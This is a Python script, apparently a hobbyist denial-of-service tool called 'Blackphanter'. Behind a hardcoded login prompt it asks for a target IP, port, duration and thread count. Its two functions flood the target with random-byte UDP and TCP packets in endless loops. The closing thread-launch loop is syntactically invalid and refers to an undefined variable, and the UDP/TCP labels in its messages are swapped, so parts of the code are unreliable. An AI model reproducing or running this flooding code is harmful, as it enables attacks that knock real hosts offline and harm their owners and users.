# -*- coding: utf-8 -*-
import random
import socket
import os
import sys
import logging
import threading
import time
import fade

os.system("clear")
os.system("https://github.com/Kodekeras24")
print("\033[37mWelcome to Zona Blackphanter\033[0m")
time.sleep(5)
print("Loading.......")

attemps = 0
os.system("clear")
logo = """
   ÷÷÷ ÷÷        ÷÷÷     ÷÷ ÷÷ ÷÷÷ ÷÷ ÷÷
 ÷÷÷            ÷÷÷ ÷÷         ÷÷÷
÷÷÷            ÷÷÷   ÷÷        ÷÷÷
÷÷÷           ÷÷÷     ÷÷       ÷÷÷
÷÷÷          ÷÷÷       ÷÷      ÷÷÷
 ÷÷÷        ÷÷÷   ÷÷ ÷÷ ÷÷     ÷÷÷
   ÷÷÷ ÷÷  ÷÷÷           ÷÷    ÷÷÷
        
"""
while attemps < 100:
    username = input("\033[32mEnter your username: \033[0m")
    password = input("\033[31mEnter your password: \033[0m")

    if username == 'bp4' and password == 'bp4':
        print("\033[32m⟩⟩ Hai...! Welcome to zona attack BLACKPHANTER \033[0m")
        break
    else:
        print('Incorrect credentials. Check if you have Caps lock on and try again.')
        attemps += 1
        continue

ip = str(input("\033[95m Target IP :\033[0m"))
port = int(input("\033[94m Target Port :\033[0m"))
times = int(input("\033[33m Time :\033[0m"))
threads = int(input("\033[37m Threads :\033[0m"))

time.sleep(5),
print("\033[33m  ⟩⟩  Welcome to zana attack....!!! \033[0m "),

def run():
	data = random._urandom(1024)
	i = random.choice(("[💥]","[🚀]","[🔥]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print("[+]  \033[32mTCP  \033[33mנפגע על ידי סערה מדברית\033[0m    " +ip+ "")
			print("\033[35m—————————————————————————————————————————————————💥\033[0m")
		except:
			print("[-]  \033[31mMay be down\033[0m")

def run2():
	data = random._urandom(999)
	i = random.choice(("[💥]","[🚀]","[🔥]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print("[*]  \033[96mUDP  \033[92mBlackPhanter-\033[95mattack Sent   \033[33m" +ip+ "\033[0m")
			print("\033[36m—————————————————————————————————————————————————💥\033[0m")
		except:
			s.close()
			print("[-]  \033[31mMay be down\033[0m")



			
for 'x' in range(threads):
	if choice == 'x':
		th = threading.Thread(target = run)
		th.start()
	else:
	        th = threading.Thread(target = run2)
		
